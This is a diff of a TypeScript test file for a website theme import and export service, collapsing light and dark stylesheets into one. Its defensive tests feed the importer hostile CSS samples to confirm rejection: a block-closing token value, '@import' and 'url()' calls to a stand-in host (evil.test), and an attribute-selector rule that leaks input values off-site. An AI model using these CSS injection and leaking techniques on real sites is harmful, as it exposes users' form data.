@@ -24,6 +24,7 @@ import {
   deregisterTemplatesFor,
   registerTemplate,
   THEME_PATHS,
+  THEME_PATHS_LEGACY,
   type BlockNode,
   type LayoutDocument,
   type CoreTemplateKey,
@@ -46,15 +47,15 @@ const themeLayer = new Map<TemplateKey, LayoutDocument>();
 const customised = new Set<TemplateKey>();
 
 const appearance = {
-  effective: { light: {} as Scoped, dark: {} as Scoped },
-  customCss: { light: "", dark: "" },
+  effective: {} as Scoped,
+  customCss: "",
   installed: null as Record<string, unknown> | null,
   savedThemeTokens: null as unknown,
   savedCustomCss: null as unknown,
   savedInstalled: null as Record<string, unknown> | null,
   /** The theme's OWN stylesheet layer — what an import stages, under the admin's. */
-  themeCustomCss: { light: "", dark: "" },
-  savedThemeCustomCss: null as { light: string; dark: string } | null,
+  themeCustomCss: "",
+  savedThemeCustomCss: null as string | null,
   /** Applying a theme is LIVE, so it has to tell open clients. */
   styleVersionBumps: 0,
 };
@@ -107,7 +108,7 @@ vi.mock("../appearance/appearance.service.js", () => ({
     saveCustomCss:      async (c: unknown) => { appearance.savedCustomCss = c; },
     getThemeCustomCss:  async () => appearance.themeCustomCss,
     getThemeTokens:     async () => appearance.savedThemeTokens ?? null,
-    saveThemeCustomCss: async (c: { light: string; dark: string }) => {
+    saveThemeCustomCss: async (c: string) => {
       appearance.savedThemeCustomCss = c;
     },
     setInstalledTheme:  async (m: Record<string, unknown>) => { appearance.savedInstalled = m; },
@@ -191,13 +192,13 @@ beforeEach(async () => {
   savedDrafts.clear();
   themeLayer.clear();
   customised.clear();
-  appearance.effective = { light: { global: {} }, dark: { global: {} } };
-  appearance.customCss = { light: "", dark: "" };
+  appearance.effective = { global: {} };
+  appearance.customCss = "";
   appearance.installed = null;
   appearance.savedThemeTokens = null;
   appearance.savedCustomCss = null;
   appearance.savedInstalled = null;
-  appearance.themeCustomCss = { light: "", dark: "" };
+  appearance.themeCustomCss = "";
   appearance.savedThemeCustomCss = null;
   await fs.rm(path.join(UPLOAD_DIR, "themes"), { recursive: true, force: true });
 });
@@ -257,27 +258,33 @@ describe("export", () => {
 
   it("carries the scoped tokens the CSS files cannot express", async () => {
     appearance.effective = {
-      light: { global: { "--c-bg": "#fff" }, "chrome.header": { "--c-bg": "#111" } },
-      dark:  { global: { "--c-bg": "#000" } },
+      global: { "--c-bg": "#fff" }, "chrome.header": { "--c-bg": "#111" },
     };
     const zip = new AdmZip(await themeService.exportTheme(META));
 
     const tokens = JSON.parse(zip.getEntry(THEME_PATHS.tokens)!.getData().toString());
-    expect(tokens.light["chrome.header"]["--c-bg"]).toBe("#111");
+    expect(tokens["chrome.header"]["--c-bg"]).toBe("#111");
     // `:root` CSS can only hold the global scope; it stays for `.xtstyle` readers.
-    const css = zip.getEntry(THEME_PATHS.cssLight)!.getData().toString();
+    const css = zip.getEntry(THEME_PATHS.css)!.getData().toString();
     expect(css).toContain("--c-bg: #fff;");
     expect(css).not.toContain("#111");
   });
 
-  it("carries custom CSS, and omits the files when there is none", async () => {
+  it("carries custom CSS, and omits the file when there is none", async () => {
     const zip1 = new AdmZip(await themeService.exportTheme(META));
-    expect(zip1.getEntry(THEME_PATHS.customLight)).toBeNull();
+    expect(zip1.getEntry(THEME_PATHS.custom)).toBeNull();
 
-    appearance.customCss = { light: ".x { color: red; }", dark: "" };
+    appearance.customCss = ".x { color: red; }";
     const zip2 = new AdmZip(await themeService.exportTheme(META));
-    expect(zip2.getEntry(THEME_PATHS.customLight)!.getData().toString()).toBe(".x { color: red; }");
-    expect(zip2.getEntry(THEME_PATHS.customDark)).toBeNull();
+    expect(zip2.getEntry(THEME_PATHS.custom)!.getData().toString()).toBe(".x { color: red; }");
+  });
+
+  it("writes ONE stylesheet and one token file — not the pre-collapse pairs", async () => {
+    appearance.customCss = ".x { color: red; }";
+    const names = new AdmZip(await themeService.exportTheme(META)).getEntries().map((e) => e.entryName);
+    expect(names).toContain(THEME_PATHS.css);
+    expect(names).toContain(THEME_PATHS.custom);
+    for (const legacy of Object.values(THEME_PATHS_LEGACY)) expect(names).not.toContain(legacy);
   });
 
   /**
@@ -338,7 +345,8 @@ describe("export", () => {
       ...META, license: "MIT", homepage: "https://example.com", authorUrl: "https://example.com/me",
     }));
     const manifest = JSON.parse(zip.getEntry(THEME_PATHS.manifest)!.getData().toString());
-    expect(manifest).toMatchObject({ license: "MIT", homepage: "https://example.com", packageVersion: 1 });
+    // packageVersion 2 = one look: a single `tokens.json` map and one stylesheet each.
+    expect(manifest).toMatchObject({ license: "MIT", homepage: "https://example.com", packageVersion: 2 });
   });
 });
 
@@ -392,7 +400,7 @@ describe("import", () => {
      *  carry a file for would break exactly that case. */
     it("leaves a screenshot the package does not carry untouched", async () => {
       const buf = pack(
-        { [THEME_PATHS.cssLight]: ":root { --c-bg: #fff; }" },
+        { [THEME_PATHS.css]: ":root { --c-bg: #fff; }" },
         { screenshot: "https://cdn.example.com/shot.png" },
       );
       await themeService.importTheme(buf, "user-1");
@@ -400,25 +408,73 @@ describe("import", () => {
     });
   });
 
-  it("prefers tokens.json over the :root stylesheets", async () => {
+  it("prefers tokens.json over the :root stylesheet", async () => {
     const buf = pack({
-      [THEME_PATHS.tokens]: JSON.stringify({ light: { global: { "--c-bg": "#json" } }, dark: {} }),
-      [THEME_PATHS.cssLight]: ":root { --c-bg: #css; }",
+      [THEME_PATHS.tokens]: JSON.stringify({ global: { "--c-bg": "#json" } }),
+      [THEME_PATHS.css]: ":root { --c-bg: #css; }",
     });
     await themeService.importTheme(buf, "user-1");
-    expect(appearance.savedThemeTokens).toMatchObject({ light: { global: { "--c-bg": "#json" } } });
+    expect(appearance.savedThemeTokens).toMatchObject({ global: { "--c-bg": "#json" } });
   });
 
-  it("falls back to the stylesheets when there is no tokens.json", async () => {
-    await themeService.importTheme(pack({ [THEME_PATHS.cssLight]: ":root { --c-bg: #css; }" }), "user-1");
-    expect(appearance.savedThemeTokens).toMatchObject({ light: { global: { "--c-bg": "#css" } } });
+  it("falls back to the stylesheet when there is no tokens.json", async () => {
+    await themeService.importTheme(pack({ [THEME_PATHS.css]: ":root { --c-bg: #css; }" }), "user-1");
+    expect(appearance.savedThemeTokens).toMatchObject({ global: { "--c-bg": "#css" } });
   });
 
   it("rejects a token value that could close the CSS block early", async () => {
     const buf = pack({
-      [THEME_PATHS.tokens]: JSON.stringify({ light: { global: { "--x": "red } body { display:none" } }, dark: {} }),
+      [THEME_PATHS.tokens]: JSON.stringify({ global: { "--x": "red } body { display:none" } }),
     });
     await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow(/tokens\.json is invalid/);
+  });
+
+  /**
+   * A package built before a site had ONE look. Both halves of it — the paired
+   * `tokens.json` and the paired stylesheets — still install, as the LIGHT half, and the
+   * dark half is REPORTED rather than dropped in silence: "I exported a theme with a
+   * dark mode and half of it vanished" deserves a sentence.
+   */
+  describe("a pre-collapse package", () => {
+    it("takes the light half of a paired tokens.json and names the dark one", async () => {
+      const buf = pack({
+        [THEME_PATHS.tokens]: JSON.stringify({
+          light: { global: { "--c-bg": "#light" } },
+          dark:  { global: { "--c-bg": "#dark" } },
+        }),
+      });
+      const report = await themeService.importTheme(buf, "user-1");
+      expect(appearance.savedThemeTokens).toMatchObject({ global: { "--c-bg": "#light" } });
+      expect(report.ignoredFiles).toContain(`${THEME_PATHS.tokens} (dark)`);
+    });
+
+    it("says nothing about a paired tokens.json whose dark half is empty", async () => {
+      const buf = pack({
+        [THEME_PATHS.tokens]: JSON.stringify({ light: { global: { "--c-bg": "#light" } }, dark: {} }),
+      });
+      const report = await themeService.importTheme(buf, "user-1");
+      expect(report.ignoredFiles).toEqual([]);
+    });
+
+    it("reads styles/light.css and names styles/dark.css", async () => {
+      const buf = pack({
+        [THEME_PATHS_LEGACY.cssLight]: ":root { --c-bg: #light; }",
+        [THEME_PATHS_LEGACY.cssDark]:  ":root { --c-bg: #dark; }",
+      });
+      const report = await themeService.importTheme(buf, "user-1");
+      expect(appearance.savedThemeTokens).toMatchObject({ global: { "--c-bg": "#light" } });
+      expect(report.ignoredFiles).toContain(THEME_PATHS_LEGACY.cssDark);
+    });
+
+    it("reads custom-light.css and names custom-dark.css", async () => {
+      const buf = pack({
+        [THEME_PATHS_LEGACY.customLight]: ".a { color: red }",
+        [THEME_PATHS_LEGACY.customDark]:  ".a { color: navy }",
+      });
+      const report = await themeService.importTheme(buf, "user-1");
+      expect(appearance.savedThemeCustomCss).toBe(".a { color: red }");
+      expect(report.ignoredFiles).toContain(THEME_PATHS_LEGACY.customDark);
+    });
   });
 
   it("stages custom CSS in the theme layer and says so", async () => {
@@ -427,17 +483,17 @@ describe("import", () => {
     // written, with no baseline and nothing to recover from. See the theme-custom-CSS
     // block at the bottom of this file for the rest of the behaviour.
     const report = await themeService.importTheme(
-      pack({ [THEME_PATHS.customLight]: ".x { color: red; }" }), "user-1",
+      pack({ [THEME_PATHS.custom]: ".x { color: red; }" }), "user-1",
     );
     expect(report.customCssApplied).toBe(true);
-    expect(appearance.savedThemeCustomCss).toEqual({ light: ".x { color: red; }", dark: "" });
+    expect(appearance.savedThemeCustomCss).toBe(".x { color: red; }");
     expect(appearance.savedCustomCss).toBeNull();
   });
 
   it("rejects custom CSS that does not parse, before anything is written", async () => {
     const buf = pack({
-      [THEME_PATHS.customLight]: ".x { color: red;",
-      [THEME_PATHS.tokens]: JSON.stringify({ light: { global: { "--c-bg": "#fff" } }, dark: {} }),
+      [THEME_PATHS.custom]: ".x { color: red;",
+      [THEME_PATHS.tokens]: JSON.stringify({ global: { "--c-bg": "#fff" } }),
     });
     await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow(/syntax error/);
     expect(appearance.savedThemeTokens).toBeNull();
@@ -564,18 +620,14 @@ describe("style variants", () => {
     const home = structuredClone(DEFAULT_LAYOUTS.home) as LayoutDocument;
     home.regions.main![0]!.variant = "accent";
     published.templates.home = home;
-    appearance.effective = {
-      light: { "variant.accent": { "--surface-bg": "#ff0000" } },
-      dark:  { "variant.accent": { "--surface-bg": "#330000" } },
-    };
+    appearance.effective = { "variant.accent": { "--surface-bg": "#ff0000" } };
 
     const report = await themeService.importTheme(await themeService.exportTheme(META), "user-1");
 
     expect(report.tokensApplied).toBe(true);
     expect(savedDrafts.get("home|")!.regions.main![0]!.variant).toBe("accent");
     expect(appearance.savedThemeTokens).toMatchObject({
-      light: { "variant.accent": { "--surface-bg": "#ff0000" } },
-      dark:  { "variant.accent": { "--surface-bg": "#330000" } },
+      "variant.accent": { "--surface-bg": "#ff0000" },
     });
   });
 
@@ -643,7 +695,7 @@ describe("theme inheritance", () => {
     // layer, so they survive an update per TOKEN rather than per file.
     await themeService.importTheme(pkg(), "user-1");
     expect(appearance.savedThemeTokens).toMatchObject({
-      light: { global: { "--c-accent": "#111111" } },
+      global: { "--c-accent": "#111111" },
     });
   });
 
@@ -669,8 +721,8 @@ describe("importing a legacy .xtstyle", () => {
   function stylePack(manifest: Record<string, unknown> = { name: "Ocean" }): Buffer {
     const zip = new AdmZip();
     zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify(manifest)));
-    zip.addFile(THEME_PATHS.cssLight, Buffer.from(":root {\n  --c-accent: #0aa;\n}\n"));
-    zip.addFile(THEME_PATHS.cssDark, Buffer.from(":root {\n  --c-accent: #066;\n}\n"));
+    zip.addFile(THEME_PATHS_LEGACY.cssLight, Buffer.from(":root {\n  --c-accent: #0aa;\n}\n"));
+    zip.addFile(THEME_PATHS_LEGACY.cssDark, Buffer.from(":root {\n  --c-accent: #066;\n}\n"));
     return zip.toBuffer();
   }
 
@@ -698,7 +750,7 @@ describe("importing a legacy .xtstyle", () => {
     // shipping layouts is a theme, and a theme with no id is an error, not a guess.
     const zip = new AdmZip();
     zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify({ name: "Broken" })));
-    zip.addFile(THEME_PATHS.cssLight, Buffer.from(":root {}"));
+    zip.addFile(THEME_PATHS.css, Buffer.from(":root {}"));
     zip.addFile(`${THEME_PATHS.layouts}home.json`, Buffer.from(JSON.stringify(DEFAULT_LAYOUTS.home)));
     await expect(themeService.importTheme(zip.toBuffer(), "user-1")).rejects.toThrow(/manifest/i);
   });
@@ -706,7 +758,7 @@ describe("importing a legacy .xtstyle", () => {
   it("holds the `:root`-only rule the old importer enforced", async () => {
     const zip = new AdmZip();
     zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify({ name: "Sneaky" })));
-    zip.addFile(THEME_PATHS.cssLight, Buffer.from("body { display: none; }"));
+    zip.addFile(THEME_PATHS.css, Buffer.from("body { display: none; }"));
     await expect(themeService.importTheme(zip.toBuffer(), "user-1")).rejects.toThrow(/root/i);
   });
 });
@@ -717,8 +769,7 @@ describe("tokens-only export", () => {
     const names = zip.getEntries().map((e) => e.entryName);
 
     expect(names).toContain(THEME_PATHS.tokens);
-    expect(names).toContain(THEME_PATHS.cssLight);
-    expect(names).toContain(THEME_PATHS.cssDark);
+    expect(names).toContain(THEME_PATHS.css);
     expect(names).toContain(THEME_PATHS.manifest);
     expect(names.some((n) => n.startsWith(THEME_PATHS.layouts))).toBe(false);
     // No layouts means nothing references an asset, so none are collected.
@@ -758,7 +809,7 @@ describe("rejections are actionable", () => {
   const brokenTheme = (): Buffer => {
     const zip = new AdmZip();
     zip.addFile(THEME_PATHS.manifest, Buffer.from(JSON.stringify({ name: "Sneaky" })));
-    zip.addFile(THEME_PATHS.cssLight, Buffer.from(":root {}"));
+    zip.addFile(THEME_PATHS.css, Buffer.from(":root {}"));
     // A `layouts/` folder makes this a theme, so the strict manifest applies.
     zip.addFile(`${THEME_PATHS.layouts}home.json`, Buffer.from(JSON.stringify(DEFAULT_LAYOUTS.home)));
     return zip.toBuffer();
@@ -803,43 +854,34 @@ describe("rejections are actionable", () => {
 
 describe("theme custom CSS", () => {
   const withCss = (files: Record<string, string | Buffer> = {}) =>
-    pack({ [THEME_PATHS.customLight]: ".x { color: red }", ...files });
+    pack({ [THEME_PATHS.custom]: ".x { color: red }", ...files });
 
   it("stages into the THEME layer and never touches the admin's stylesheet", async () => {
-    appearance.customCss = { light: ".mine { color: blue }", dark: ".mine-dark { color: navy }" };
+    appearance.customCss = ".mine { color: blue }";
 
     const report = await themeService.importTheme(withCss(), "user-1");
 
     expect(report.customCssApplied).toBe(true);
-    expect(appearance.savedThemeCustomCss?.light).toContain(".x");
+    expect(appearance.savedThemeCustomCss).toContain(".x");
     // The admin's own stylesheet is untouched — this is the whole point.
     expect(appearance.savedCustomCss).toBeNull();
-    expect(appearance.customCss.light).toBe(".mine { color: blue }");
-  });
-
-  it("does NOT blank the admin's dark CSS when the package ships only light", async () => {
-    // The old code wrote both admin keys together, so a light-only package silently
-    // cleared the admin's dark stylesheet.
-    appearance.customCss = { light: "", dark: ".mine-dark { color: navy }" };
-    await themeService.importTheme(withCss(), "user-1");
-    expect(appearance.customCss.dark).toBe(".mine-dark { color: navy }");
-    expect(appearance.savedThemeCustomCss?.dark).toBe("");
+    expect(appearance.customCss).toBe(".mine { color: blue }");
   });
 
   it("rewrites url(assets/…) to where the file actually landed", async () => {
     // Nothing did this before, so every image a theme shipped through its stylesheet
     // resolved against /api/appearance/css and 404'd.
     const buf = pack({
-      [THEME_PATHS.customLight]: `.hero { background: url("assets/tile.png") }`,
+      [THEME_PATHS.custom]: `.hero { background: url("assets/tile.png") }`,
       [`${THEME_PATHS.assets}tile.png`]: PNG,
     });
     await themeService.importTheme(buf, "user-1");
-    expect(appearance.savedThemeCustomCss?.light)
+    expect(appearance.savedThemeCustomCss)
       .toContain(`url("/uploads/themes/${META.id}/tile.png")`);
   });
 
   it("REFUSES @import — it fetches a stylesheet from another server", async () => {
-    const buf = withCss({ [THEME_PATHS.customLight]: `@import url("https://evil.test/x.css"); .a{color:red}` });
+    const buf = withCss({ [THEME_PATHS.custom]: `@import url("https://evil.test/x.css"); .a{color:red}` });
     await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow(/@import/);
   });
 
@@ -849,14 +891,14 @@ describe("theme custom CSS", () => {
       `.a { background: url("//evil.test/p.png") }`,
       `input[value^="a"] { background: url('http://evil.test/a') }`,
     ]) {
-      await expect(themeService.importTheme(withCss({ [THEME_PATHS.customLight]: bad }), "user-1"))
+      await expect(themeService.importTheme(withCss({ [THEME_PATHS.custom]: bad }), "user-1"))
         .rejects.toThrow(/another server/);
     }
   });
 
   it("REFUSES a reference the package does not carry, naming it", async () => {
     const err = await rejectionOf(themeService.importTheme(
-      withCss({ [THEME_PATHS.customLight]: `.a { background: url(assets/absent.png) }` }), "user-1",
+      withCss({ [THEME_PATHS.custom]: `.a { background: url(assets/absent.png) }` }), "user-1",
     ));
     expect(err.message).toContain("assets/absent.png");
     expect(err.message).toMatch(/does not carry/);
@@ -865,15 +907,15 @@ describe("theme custom CSS", () => {
   it("allows data: URLs and site-absolute paths — neither can reach off-site", async () => {
     const css = `.a{background:url("data:image/gif;base64,R0lGODlhAQABAAAAACw=")}`
       + `.b{background:url(/uploads/branding/logo.png)}`;
-    await themeService.importTheme(withCss({ [THEME_PATHS.customLight]: css }), "user-1");
-    expect(appearance.savedThemeCustomCss?.light).toContain("data:image/gif");
-    expect(appearance.savedThemeCustomCss?.light).toContain("/uploads/branding/logo.png");
+    await themeService.importTheme(withCss({ [THEME_PATHS.custom]: css }), "user-1");
+    expect(appearance.savedThemeCustomCss).toContain("data:image/gif");
+    expect(appearance.savedThemeCustomCss).toContain("/uploads/branding/logo.png");
   });
 
   it("refuses BEFORE writing anything — a rejected package leaves no assets on disk", async () => {
     // All-or-nothing, the same rule the layouts and tokens follow.
     const buf = pack({
-      [THEME_PATHS.customLight]: `.a { background: url(https://evil.test/p.png) }`,
+      [THEME_PATHS.custom]: `.a { background: url(https://evil.test/p.png) }`,
       [`${THEME_PATHS.assets}tile.png`]: PNG,
     });
     await expect(themeService.importTheme(buf, "user-1")).rejects.toThrow();
@@ -885,14 +927,11 @@ describe("theme custom CSS", () => {
     // Without this an exported stylesheet points at the SOURCE site's uploads — a broken
     // image everywhere else, and a package the importer would now refuse outright.
     await write(`themes/${META.id}/tile.png`, PNG);
-    appearance.themeCustomCss = {
-      light: `.hero { background: url("/uploads/themes/${META.id}/tile.png") }`,
-      dark:  "",
-    };
-    appearance.customCss = { light: ".mine { color: blue }", dark: "" };
+    appearance.themeCustomCss = `.hero { background: url("/uploads/themes/${META.id}/tile.png") }`;
+    appearance.customCss = ".mine { color: blue }";
 
     const zip = new AdmZip(await themeService.exportTheme(META));
-    const css = zip.getEntry(THEME_PATHS.customLight)!.getData().toString();
+    const css = zip.getEntry(THEME_PATHS.custom)!.getData().toString();
 
     expect(css).toContain(`url("assets/tile.png")`);
     expect(zip.getEntry(`${THEME_PATHS.assets}tile.png`)?.getData()).toEqual(PNG);
